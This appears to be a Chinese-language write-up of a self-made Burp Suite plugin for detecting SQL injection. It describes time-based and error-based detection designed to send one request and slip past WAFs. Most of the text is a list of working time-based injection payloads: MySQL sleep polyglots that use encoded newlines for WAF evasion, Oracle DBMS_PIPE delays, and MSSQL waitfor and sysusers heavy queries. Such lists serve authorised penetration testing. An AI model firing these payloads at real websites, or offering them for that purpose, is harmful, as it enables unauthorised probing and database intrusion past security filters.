# 0x00 前言
Burp自带的SQLi扫描，发送的burp感觉有点多，在有waf的情况下，收到极大的限制。所以写一款适合自己的SQLi扫描插件（只发送一次数据包）。

# 0x01 检测原理
检测时间注入(减少发包量)，报错型注入(检测页面是否有sql错误提示，不需要发包)。
采用的payload是`11^%0axor(sleep(5))#'xor(sleep(5))#"^xor(sleep(5))#'`，浏览器中``11%0axor(sleep(5))%23'xor(sleep(5))%23"xor(sleep(5))%23'``,这样可以一次性检测数字型、字符型使用`'`或`"`作为分隔符的字符型)注入。不过`Insert`、`Limit`、`()`等一些注入，还没有找到好的办法进行检测。

payload
`11%0axor(sleep(5))%23'xor(sleep(5))%23"xor(sleep(5))%23'`

`5%0axor%0asleep(5)/*'xor%0asleep(5)xor%0a'"xor%0asleep(5)xor%0a"*/`

`5%0a-%0asleep(5)/*'-%0asleep(5)-%0a'"-%0asleep(5)-%0a"*/`

`5-SLEEP(5)/*'-SLEEP(5)-'"-SLEEP(5)-"*/`

`5>SLEEP(5)/*'>SLEEP(5)>'">SLEEP(5)>"*/`

`'||(SELECT 1 FROM DUAL WHERE 6994=6994 AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)||CHR(99)||CHR(76)||CHR(110),5))||'`

`'%2b(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8,sysusers AS sys9)%2b'`

` waitfor delay '0:0:5' --`

`' waitfor delay '0:0:5' --`

`') waitfor delay '0:0:5' --`

`) waitfor delay '0:0:5' --`

延迟2秒左右
`'||(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T4,ALL_USERS T4,ALL_USERS T5)||'`

`'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(69)||CHR(114)||CHR(69),5)||'`

`OR 8003=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)||CHR(99)||CHR(76)||CHR(110),5)`

`' OR 8003=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)||CHR(99)||CHR(76)||CHR(110),5) AND 'jmBZ' LIKE 'jmBZ`

`') OR 8003=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)||CHR(99)||CHR(76)||CHR(110),5) AND ('jmBZ' LIKE 'jmBZ`


` AND 8003=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)||CHR(99)||CHR(76)||CHR(110),5)`

`' AND 8003=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)||CHR(99)||CHR(76)||CHR(110),5) AND 'jmBZ'='jmBZ`

`') AND 8003=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)||CHR(99)||CHR(76)||CHR(110),5) AND ('jmBZ'='jmBZ`

` and 1733=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8,sysusers AS sys9)  -- ' and 1= (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8,sysusers AS sys9) -- s`
